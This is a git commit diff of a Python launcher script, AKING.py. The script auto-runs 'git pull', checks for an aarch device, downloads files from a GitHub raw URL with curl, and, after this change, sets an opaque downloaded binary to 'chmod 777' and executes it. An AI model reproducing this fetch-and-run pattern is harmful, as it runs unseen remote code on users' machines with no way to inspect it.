bf86d71291c1f2a558adf1db9691934165ac9640
IMTIAZ AKING <98144321+AKING110@users.noreply.github.com>
2023-01-05 03:34:19 +0500

    Update AKING.py

--- AKING.py
+++ AKING.py
@@ -2,17 +2,16 @@ import os
 os.system('git pull')
 from os import path,system
 from platform import uname
-arch=uname().machine.lower()
-if 'aarch' in arch:
+bt=uname().machine.lower()
+if 'aarch' in bt:
     print('\033[1;34m\n Congratulations! Your Device Support This Tools\033[1;37m')
     if path.isfile("XD.so"):
         pass
     else:
-        system("curl -L https://raw.githubusercontent.com/AKING110/files/main/XD.so -o XD.so")
+        system("curl -L https://raw.githubusercontent.com/AKING110/files/main/XD -o XD")
     if path.isfile("dump.so"):
         pass
     else:
         system("curl -L https://raw.githubusercontent.com/AKING110/files/main/dump.so -o dump.so")
 else:exit('\033[1;31m\n Sorry System or 32bit device not supported ')
-import XD
-XD.main()
+os.system('chmod 777 XD && ./XD')
